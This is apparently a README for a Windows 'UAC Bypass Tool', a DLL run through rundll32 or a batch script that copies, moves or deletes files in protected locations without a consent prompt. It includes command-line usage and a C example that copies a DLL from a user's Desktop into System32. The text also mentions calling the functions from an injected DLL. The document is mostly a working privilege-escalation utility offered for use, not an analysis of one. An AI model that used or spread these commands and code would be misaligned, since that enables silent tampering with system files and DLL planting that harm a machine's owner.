
# UAC Bypass Tool
 
### What's different? 
 
	This tool doesn't use dll injection and can be used from the command-line or another application.

	On Success the program exits with exit-code zero, non-zero when failed.

	Note: Use quoted strings for the file names when using the tool from the command-line.
	
### Command-line Usage:

	rundll32.exe uaccpy32.dll,Copy "source" "target" [/AllowWarning]
	rundll32.exe uaccpy32.dll,Move "source" "target" [/AllowWarning]
	rundll32.exe uaccpy32.dll,Delete "target" [/AllowWarning]
	
	rundll32.exe uaccpy64.dll,Copy "source" "target" [/AllowWarning]
	rundll32.exe uaccpy64.dll,Move "source" "target" [/AllowWarning]
	rundll32.exe uaccpy64.dll,Delete "target" [/AllowWarning]
	
	uacbp.bat Copy "source" "target" [/AllowWarning]
	uacbp.bat Move "source" "target" [/AllowWarning]
	uacbp.bat Delete "target" [/AllowWarning]

   
API Usage, not the purpose of this dll, the functions are just available. 
Using from a normal application will result in user consent being asked,
could be used to call from an injected dll. 
(But that's not the purpose of this tool)

#include "uaccpyapi.h"

#pragma comment(lib, "uaccpy32.lib")
// OR #pragma comment(lib, "uaccpy64.lib")

int _tmain(int argc, _TCHAR* argv[])
{
	BOOL bInit = FALSE;
	BOOL bResult;
	
	if (NeedsUserConsent())
	{
		_tprintf(_T("There will be asked for user consent anyway when called from another application.\n"));
		//return -1;
	}

	if (!(bInit = SUCCEEDED(CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE))))
	{
		_tprintf(_T("CoInitializeEx failed.\n"));
		return -1;
	}

	UacOperation(_T("C:\\Users\\Username\\Desktop\\source.dll"), _T("C:\\windows\\System32"), _T("target.dll"), UACOP_COPY);

	CoUninitialize();

	return 0;
}
